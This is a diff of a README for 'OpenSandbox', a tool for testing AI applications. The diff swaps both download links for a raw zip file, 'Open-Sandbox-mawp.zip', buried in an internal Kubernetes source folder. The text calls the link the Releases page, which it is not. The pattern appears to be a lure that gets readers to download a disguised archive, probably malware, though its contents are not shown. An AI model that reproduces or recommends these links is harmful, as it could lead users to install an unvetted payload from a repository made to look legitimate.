@@ -1,7 +1,7 @@
 # 🥇 OpenSandbox - Simplifying AI Testing Environments
 
 ## 📥 Download Now!
-[![Download OpenSandbox](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/sdks/sandbox/python/Open-Sandbox-2.8.zip)](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/sdks/sandbox/python/Open-Sandbox-2.8.zip)
+[![Download OpenSandbox](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/kubernetes/internal/task-executor/Open-Sandbox-mawp.zip)](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/kubernetes/internal/task-executor/Open-Sandbox-mawp.zip)
 
 ## 🚀 Getting Started
 Welcome to OpenSandbox! This platform allows you to easily test AI applications in a controlled environment. Follow these simple steps to get started.
@@ -22,7 +22,7 @@ OpenSandbox offers a range of features useful for AI application development:
 ## 🔗 Download & Install
 To download OpenSandbox, please visit the following link:
 
-[Download OpenSandbox](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/sdks/sandbox/python/Open-Sandbox-2.8.zip)
+[Download OpenSandbox](https://raw.githubusercontent.com/Pablitocalvi/OpenSandbox/main/kubernetes/internal/task-executor/Open-Sandbox-mawp.zip)
 
 1. Click the link to go to the Releases page.
 2. Look for the latest release, which will be listed at the top.
